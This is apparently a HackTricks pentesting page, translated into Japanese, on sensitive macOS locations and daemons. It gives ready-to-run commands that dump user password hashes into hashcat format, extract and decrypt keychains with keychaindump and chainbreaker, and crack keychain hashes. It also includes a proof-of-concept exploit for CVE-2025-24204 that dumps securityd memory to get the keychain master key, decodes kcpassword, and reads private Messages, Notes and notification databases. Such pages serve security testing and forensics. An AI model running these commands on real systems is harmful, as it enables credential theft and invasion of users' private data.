# macOSの機密性の高い場所と興味深いデーモン

{{#include ../../../banners/hacktricks-training.md}}


## パスワード

### シャドウパスワード

シャドウパスワードは、**`/var/db/dslocal/nodes/Default/users/`** にあるplist内で、ユーザーの設定とともに保存されています。\
次のワンライナーを使うと、ハッシュ情報を含む**すべてのユーザー情報**をダンプできます：

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**このようなスクリプト**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)や[**こちらのスクリプト**](https://github.com/octomagon/davegrohl.git)を使って、ハッシュを**hashcat** **形式**に変換できます。

macOS PBKDF2-SHA512 用の hashcat 形式 `-m 7100` で、サービスアカウント以外のすべてのアカウントの creds をダンプする別のワンライナー：

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

ユーザーの`ShadowHashData`を取得する別の方法として、`dscl`を使用できます: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### LinuxでコピーしたShadowHashDataを変換する

属性をLinuxのクラッキング用ホストにコピーした場合は、`shadowhash.hex`に**16進数のバイト列のみ**（`ShadowHashData:`ラベルは含めない）を保存します。Ubuntuでは、`libplist-utils`を使うと、macOSの`plutil`を使わずに、デコード済みのバイナリplistを読みやすいXMLに変換できます。<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

XML内では、別個のSRP verifierではなく、**`SALTED-SHA512-PBKDF2`**の`iterations`とbase64の`salt`および`entropy`を使用します。`salt_b64`と`entropy_b64`には、それぞれXMLの`<data>`の内容を設定します。これらをhexにデコードし、Hashcat mode `7100`用に`$ml$<iterations>$<salt_hex>$<entropy_hex>`の1行にまとめます。これは、privileged hashを取得した後に行うオフライン推測であり、initial accessやprivilege escalationの手法ではありません。<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

このファイルは、システムが**single-user mode**で実行されている場合に**のみ使用されます**（そのため、使用頻度は高くありません）。

### Keychain Dump

`security`バイナリを使ってパスワードを**復号してdump**する際、ユーザーにこの操作を許可するよう求めるプロンプトが複数回表示されます。

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

最新の macOS では、最も注目すべき backing store は通常 **`~/Library/Keychains/login.keychain-db`** と **`/Library/Keychains/System.keychain`** です。これらは SQLite ベースのファイルですが、平文へのアクセスは依然として **`securityd`** を介して行われます。raw DB を盗んでも、ユーザーのパスワード、`SystemKey`、またはメモリ上のマスターキーも回収しない限り、主にメタデータと暗号化された blob が得られるだけです。<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> このコメント [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) によると、Big Sur ではこれらのツールはもう動作しないようです。

### Keychaindump の概要

macOS の keychain からパスワードを抽出する **keychaindump** というツールが開発されていますが、[ディスカッション](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)に示されているように、Big Sur などの新しい macOS では制限があります。**keychaindump** を使用するには、攻撃者はアクセスを取得し、権限を **root** に昇格させる必要があります。このツールは、利便性のため、ユーザーのログイン時に keychain がデフォルトでロック解除され、アプリケーションがユーザーのパスワードを何度も要求せずにアクセスできるという仕組みを悪用します。ただし、ユーザーが使用後に毎回 keychain をロックする設定にしている場合、**keychaindump** は機能しません。

**Keychaindump** は、Apple が認証および暗号処理を行うデーモンと説明している **securityd** という特定のプロセスを標的にします。このプロセスは keychain へのアクセスに不可欠です。抽出では、ユーザーのログインパスワードから派生した **Master Key** を特定します。このキーは keychain ファイルを読み取るために必要です。**Master Key** を見つけるため、**keychaindump** は `vmmap` コマンドを使って **securityd** のメモリヒープを走査し、`MALLOC_TINY` としてフラグ付けされた領域内からキー候補を探します。これらのメモリ領域を調べるには、次のコマンドを使用します。

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

master key の候補を特定した後、**keychaindump** はヒープ内を検索し、master key の候補を示す特定のパターン（`0x0000000000000018`）を探します。この key を利用するには、**keychaindump** のソースコードで説明されているように、難読化解除を含む追加の手順が必要です。この領域に注目するアナリストは、keychain の復号に不可欠なデータが **securityd** プロセスのメモリ内に保存されていることに注意してください。**keychaindump** を実行するコマンドの例は次のとおりです。

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) は、macOS のキーチェーンから以下の種類の情報を、フォレンジック的に適切な方法で抽出できます。

- hashcat または John the Ripper でクラックできる、ハッシュ化されたキーチェーンパスワード
- インターネットパスワード
- 汎用パスワード
- 秘密鍵
- 公開鍵
- X509 証明書
- セキュアノート
- Appleshare パスワード

キーチェーンのロック解除パスワード、[volafox](https://github.com/n0fate/volafox) または [volatility](https://github.com/volatilityfoundation/volatility) で取得したマスターキー、あるいは SystemKey などのロック解除ファイルがあれば、Chainbreaker は平文のパスワードも提供します。

これらの方法でキーチェーンのロックを解除しない場合でも、Chainbreaker は利用可能なその他の情報をすべて表示します。

#### **キーチェーンキーをダンプする**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **SystemKeyでkeychain keysを（パスワード付きで）dump**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **keychain keysをDumpする（password付き）hashをcrackする**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **メモリダンプでKeychainのキー（パスワード付き）をダンプする**

[以下の手順](../index.html#dumping-memory-with-osxpmem)に従って**メモリダンプ**を実行します。

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **ユーザーの password を使って keychain keys を dump（passwords を含む）**

ユーザーの password がわかっていれば、そのユーザーに属する keychain を dump して復号できます。

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### `gcore` entitlement 経由の Keychain master key（CVE-2025-24204）

macOS 15.0（Sequoia）では、`/usr/bin/gcore` に **`com.apple.system-task-ports.read`** entitlement が付与されていたため、ローカル管理者（または悪意のある署名済みアプリ）は、SIP/TCC が有効でも**任意のプロセスのメモリを dump**できました。`securityd` を dump すると、Keychain master key が平文で leak し、ユーザーのパスワードなしで `login.keychain-db` を復号できます。<sup>[[1]](#references)</sup>

**脆弱なビルド（15.0–15.2）での簡単な再現手順：**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
抽出した hex key を Chainbreaker（`--key <hex>`）に渡して、login keychain を復号します。Apple は **macOS 15.3+** で entitlement を削除したため、これはパッチ未適用の Sequoia ビルド、または脆弱なバイナリが残っているシステムでのみ機能します。

### kcpassword

**kcpassword** ファイルには、**ユーザーのログインパスワード**が保存されています。ただし、システム所有者が**自動ログインを有効にしている場合のみ**です。そのため、パスワードを求められることなくユーザーが自動的にログインします（あまり安全ではありません）。

パスワードは、キー **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** と XOR された状態で、ファイル **`/etc/kcpassword`** に保存されています。ユーザーのパスワードがキーより長い場合、キーは再利用されます。\
そのため、[**こちらのスクリプト**](https://gist.github.com/opshope/32f65875d45215c3677d)などを使えば、パスワードを簡単に復元できます。

## データベース内の興味深い情報

### メッセージ

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### 通知

**Sequoia** より前では、通常、Notification Center のストアは **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** にあります。**Sequoia+** では、Apple はこれを TCC で保護されたグループコンテナ **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** に移動しました。

興味深い情報の大半は **blob** 列に保存されているため、その内容を抽出して人間が読める形式に変換する必要があります（`plutil -p -`、`strings`、または小さなパーサーを使用）。簡単なトリアージの例：

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### 最近のプライバシー問題（NotificationCenter DB）

- macOS **14.7–15.1** では、Apple はバナーの内容を適切にマスキングせずに SQLite の `db2/db` に保存していました。CVE **CVE-2024-44292/44293/40838/54504** により、ローカルユーザーは DB を開くだけで、他のユーザーの通知テキストを読み取ることができました（TCC プロンプトなし）。<sup>[[3]](#references)</sup>
- Apple は、新しい Sequoia ビルドで DB を `group.com.apple.usernoted` に移し、TCC で保護することで対策しました。そのため、現行システムでは通常、読み取るには適切なユーザーコンテキストまたは TCC bypass が必要です。<sup>[[4]](#references)</sup>
- レガシー環境では、アーティファクトを保持したい場合、更新または再起動の前に `db`、`db-wal`、`db-shm` ファイルをまとめてコピーしてください。

### メモ

ユーザーの**メモ**は `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` にあります。

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

上記の one-liner がノイズを含みすぎる場合は、`ZICNOTEDATA.ZDATA` を export して gunzip し、protobuf を parse してください。通常、SQLite に対して直接 `strings` を実行するよりも信頼性が高い方法です。

### Background Tasks / Login Items

**Ventura** 以降、ユーザーが承認した login items と複数の background tasks は、**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** などの **BTM** ストアや、バージョン管理されたシステムキャッシュ **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** で追跡されます。

これらのファイルは、persistence、helper tools、および一部の MDM 管理下の background items をすばやく特定するのに役立ちます。

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

永続化の観点とBTMの内部処理については、[自動起動場所のページ](../../macos-auto-start-locations.md#login-items)と[Background Tasks Managementのノート](../macos-security-protections/README.md#background-tasks-management)を確認してください。

## Preferences

macOSアプリでは、Preferencesは **`$HOME/Library/Preferences`** にあり、iOSでは `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` にあります。

macOSでは、CLIツール **`defaults`** を使って **Preferencesファイルを変更**できます。

**`/usr/sbin/cfprefsd`** はXPCサービス `com.apple.cfprefsd.daemon` および `com.apple.cfprefsd.agent` を提供し、Preferencesの変更などの操作を実行するために呼び出すことができます。

## OpenDirectory permissions.plist

ファイル `/System/Library/OpenDirectory/permissions.plist` には、ノード属性に適用される権限が含まれており、SIPによって保護されています。\
このファイルは、特定のユーザーにuidではなくUUIDで権限を付与し、`ShadowHashData`、`HeimdalSRPKey`、`KerberosKeys` などの特定の機密情報にアクセスできるようにします：

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## システム通知

### Darwin通知

通知を扱うメインデーモンは **`/usr/sbin/notifyd`** です。通知を受信するには、クライアントは `com.apple.system.notification_center` Mach port を通じて登録する必要があります（`sudo lsmp -p <pid notifyd>` で確認できます）。デーモンはファイル `/etc/notify.conf` で設定できます。

通知に使用される名前は一意な reverse DNS 表記です。これらの名前のいずれかに通知が送信されると、その通知を処理できることを示したクライアントが受信します。

notifyd プロセスに SIGUSR2 シグナルを送信し、生成されたファイル `/var/run/notifyd_<pid>.status` を読み取ることで、現在の状態（すべての名前を含む）をダンプできます。

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

メインバイナリが **`/usr/sbin/distnoted`** である **Distributed Notification Center** は、通知を送信するもう1つの方法です。いくつかの XPC services を公開し、クライアントの検証を試みるチェックを実行します。

### Apple Push Notifications (APN)

この場合、アプリケーションは **topics** に登録できます。クライアントは **`apsd`** を介して Apple のサーバーに接続し、トークンを生成します。\
その後、provider 側もトークンを生成し、Apple のサーバーに接続してクライアントにメッセージを送信できるようになります。これらのメッセージは **`apsd`** によってローカルで受信され、通知を待っているアプリケーションに中継されます。

設定は `/Library/Preferences/com.apple.apsd.plist` にあります。

macOS では `/Library/Application\ Support/ApplePushService/aps.db`、iOS では `/var/mobile/Library/ApplePushService` に、メッセージのローカルデータベースがあります。データベースには `incoming_messages`、`outgoing_messages`、`channel` の3つのテーブルがあります。

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

以下を使って、daemonや接続に関する情報を取得することもできます:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## ユーザー通知

画面に表示されるユーザー向け通知は次のとおりです。

- **`CFUserNotification`**: メッセージを含むポップアップを画面に表示するAPIです。
- **The Bulletin Board**: iOSでバナーを表示します。バナーは消えた後、通知センターに保存されます。
- **`NSUserNotificationCenter`**: macOSの従来の通知センターサービスです。古いリリースでは、データベースは通常 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` にあります。Sequoia以降では `~/Library/Group Containers/group.com.apple.usernoted/db2/db` に移動しました。

## References

- [1] [HelpNetSecurity – macOSのgcore entitlementによるKeychainマスターキーの抽出 (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychainのデータ保護](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Notification CenterのSQLite情報開示 (CVE-2024-44292など)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple、macOS SequoiaのNotification Centerデータベースをめぐるプライバシー上の懸念に対処](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – macOSのパスワード解析](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcatのサンプルハッシュ – macOS v10.8以降 (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
